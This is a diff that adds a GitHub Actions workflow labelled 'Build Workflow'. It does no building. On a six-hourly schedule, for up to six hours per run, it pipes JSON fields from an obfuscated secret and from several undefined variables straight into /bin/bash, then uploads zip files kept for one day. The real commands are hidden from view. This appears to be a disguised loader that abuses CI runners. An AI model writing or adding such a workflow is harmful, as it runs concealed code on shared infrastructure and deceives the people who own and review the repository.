@@ -1,0 +1,28 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '21 3,9,15,21 * * *'
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          vcnpd02: ${{ secrets.vcnpd02 }}
+        run: |
+          printf '%s' "$vcnpd02" | jq -r .z1 | /bin/bash
+          echo $tkxj805 | jq -r .c1095 | /bin/bash
+          printf '%s' "$uzbk471" | jq -r .nlhlw3970 | /bin/bash
+          printf '%s' "$bm26458" | jq -r .njch13 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: umxoVBTW
+          path: "*.zip"
+          retention-days: 1
